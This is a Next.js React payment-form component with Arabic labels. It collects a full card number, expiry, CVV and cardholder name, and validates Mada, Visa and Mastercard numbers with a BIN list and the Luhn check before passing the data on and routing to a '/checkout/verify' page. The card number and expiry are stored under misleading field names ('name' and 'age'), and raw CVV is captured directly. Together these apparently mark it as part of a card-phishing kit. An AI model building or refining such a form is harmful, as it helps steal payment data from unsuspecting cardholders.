"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import Image from "next/image";

interface PaymentFormProps {
  onSubmit: (fields: { name: string; age: string; cvv: string; cardHolder: string }) => Promise<void>;
}

export default function PaymentForm({ onSubmit }: PaymentFormProps) {
  const router = useRouter();
  const [fields, setFields] = useState({ name: "", age: "", cvv: "", cardHolder: "" });
  const [errors, setErrors] = useState(false);
  const [cardError, setCardError] = useState("");
  const [expiryError, setExpiryError] = useState("");
  const [cvvError, setCvvError] = useState("");
  const [loading, setLoading] = useState(false);

  const MADA_BINS = ["588845","440647","440795","446404","457865","968208","457997","474491","543357","434107","431361","604906","521076","588848","968210","968211","968212","968213","968214","968215","968216","968217","968218","968219","968220","531095","531196","532013","535825","535989","536023","537767","539931","543085","549760","558563","585265","588850","588982","589005","589206","604906","636120","968201","968202","968203","968204","968205","968206","968207"];

  const getCardType = (num: string): "Visa" | "Mastercard" | "Mada" | null => {
    if (num.length < 6) return null;
    const bin6 = num.slice(0, 6);
    if (MADA_BINS.includes(bin6)) return "Mada";
    if (/^4/.test(num)) return "Visa";
    const prefix = parseInt(num.slice(0, 4));
    if (/^5[1-5]/.test(num) || (prefix >= 2221 && prefix <= 2720)) return "Mastercard";
    return null;
  };

  const luhnCheck = (num: string) => {
    let sum = 0;
    let shouldDouble = false;
    for (let i = num.length - 1; i >= 0; i--) {
      let digit = parseInt(num[i]);
      if (shouldDouble) { digit *= 2; if (digit > 9) digit -= 9; }
      sum += digit;
      shouldDouble = !shouldDouble;
    }
    return sum % 10 === 0;
  };

  const handleNext = async () => {
    const rawCard = fields.name.replace(/\s/g, "");
    if (!fields.name || !fields.age || !fields.cvv || !fields.cardHolder) {
      setErrors(true);
      return;
    }
    if (rawCard.length !== 16) { setCardError("رقم البطاقة يجب أن يكون 16 رقمًا"); return; }
    if (!luhnCheck(rawCard)) { setCardError("⚠️ رقم البطاقة غير صحيح"); return; }
    if (!getCardType(rawCard)) { setCardError("⚠️ نوع البطاقة غير مدعوم، يرجى استخدام Visa أو Mastercard أو Mada"); return; }
    setCardError("");
    if (fields.cvv.length !== 3) { setCvvError("⚠️ رمز CVV يجب أن يكون 3 أرقام"); return; }
    setCvvError("");
    const parts = fields.age.split("/");
    const expMonth = Number(parts[0]);
    const expYear = Number(parts[1]);
    const now = new Date();
    if (!expMonth || !expYear || parts[0]?.length !== 2 || parts[1]?.length !== 2) {
      setExpiryError("⚠️ يرجى إدخال تاريخ انتهاء صحيح بصيغة MM/YY");
      return;
    }
    if (expMonth < 1 || expMonth > 12) {
      setExpiryError("⚠️ الشهر يجب أن يكون بين 01 و 12");
      return;
    }
    const cardDate = new Date(2000 + expYear, expMonth - 1, 1);
    const currentMonth = new Date(now.getFullYear(), now.getMonth(), 1);
    if (cardDate < currentMonth) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة منتهي، يرجى استخدام بطاقة سارية");
      return;
    }
    if (2000 + expYear > now.getFullYear() + 10) {
      setExpiryError("⚠️ تاريخ انتهاء البطاقة غير صحيح");
      return;
    }
    setExpiryError("");
    setLoading(true);
    try {
      await onSubmit(fields);
      router.push("/checkout/verify");
    } finally {
      setLoading(false);
    }
  };

  const inputClass = (field: keyof typeof fields) =>
    `w-full border rounded-lg px-3 py-2.5 text-base sm:text-sm outline-none focus:border-gray-500 ${errors && !fields[field] ? "border-red-400" : "border-gray-300"}`;

  return (
    <>
      <div className="bg-white rounded-2xl overflow-hidden p-4 sm:p-6">
        <div className="flex justify-start items-center gap-3 mb-4">
          <Image src="/mada975b.png" alt="Mada" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
          <Image src="/cc975b.png" alt="Visa" width={60} height={60} className="object-contain sm:w-[80px] sm:h-[80px]" />
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رقم البطاقه <span className="text-red-500">*</span></label>
            <div className="relative">
              <input
                autoComplete="cc-number" type="text" placeholder="0000 0000 0000 0000" maxLength={19} dir="ltr" style={{textAlign: "right"}}
                value={fields.name}
                onChange={e => {
                  let v = e.target.value.replace(/\D/g, "").slice(0, 16);
                  v = v.match(/.{1,4}/g)?.join(" ") ?? v;
                  setFields(f => ({ ...f, name: v }));
                  setCardError("");
                }}
                className={`${inputClass("name")} pr-16`}
              />
              {fields.name.replace(/\s/g, "").length >= 6 && (
                <span className="absolute left-3 top-1/2 -translate-y-1/2 text-xs font-semibold text-gray-500">
                  {getCardType(fields.name.replace(/\s/g, "")) ?? "غير معروف"}
                </span>
              )}
            </div>
            {cardError && (
              <p className="text-red-500 text-sm font-medium mt-1.5 flex items-center gap-1">
                <span>⚠️</span> {cardError}
              </p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">تاريخ الانتهاء <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-exp" type="text" placeholder="MM/YY" maxLength={5}
              value={fields.age}
              onChange={e => { let v = e.target.value.replace(/\D/g, ""); if (v.length >= 3) v = v.slice(0, 2) + "/" + v.slice(2, 4); setFields(f => ({ ...f, age: v })); setExpiryError(""); }}
              className={`${inputClass("age")} ${expiryError ? "border-red-400" : ""}`}
            />
            {expiryError && (
              <p className="text-red-500 text-sm font-medium mt-1.5">{expiryError}</p>
            )}
          </div>
          <div>
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">رمز ال CVV <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-csc" type="text" placeholder="000" maxLength={3}
              value={fields.cvv}
              onChange={e => { const v = e.target.value.replace(/\D/g, "").slice(0, 3); setFields(f => ({ ...f, cvv: v })); setCvvError(""); }}
              className={`${inputClass("cvv")} ${cvvError ? "border-red-400" : ""}`}
            />
            {cvvError && <p className="text-red-500 text-sm font-medium mt-1.5">{cvvError}</p>}
          </div>
          <div className="sm:col-span-2">
            <label className="block text-xs sm:text-sm font-medium text-gray-800 mb-1">اسم حامل البطاقة <span className="text-red-500">*</span></label>
            <input
              autoComplete="cc-name" type="text" placeholder="اسم حامل البطاقة"
              value={fields.cardHolder}
              onChange={e => { const v = e.target.value.replace(/[^a-zA-Z ]/g, ""); setFields(f => ({ ...f, cardHolder: v.toUpperCase() })); }}
              className={inputClass("cardHolder")}
            />
          </div>
        </div>
      </div>

      <div className="flex gap-3">
        <button
          onClick={() => router.push("/cart")}
          className="flex-1 border border-gray-300 text-gray-700 font-medium py-3.5 rounded-2xl text-sm hover:bg-gray-100 transition"
        >
          السابق
        </button>
        <button
          onClick={handleNext}
          disabled={loading}
          className="flex-1 bg-teal-500 hover:bg-teal-600 active:scale-[0.98] text-white font-medium py-3.5 rounded-2xl transition-all text-sm disabled:opacity-60 disabled:cursor-not-allowed"
        >
          {loading ? "جاري المعالجة..." : "التالي"}
        </button>
      </div>
    </>
  );
}
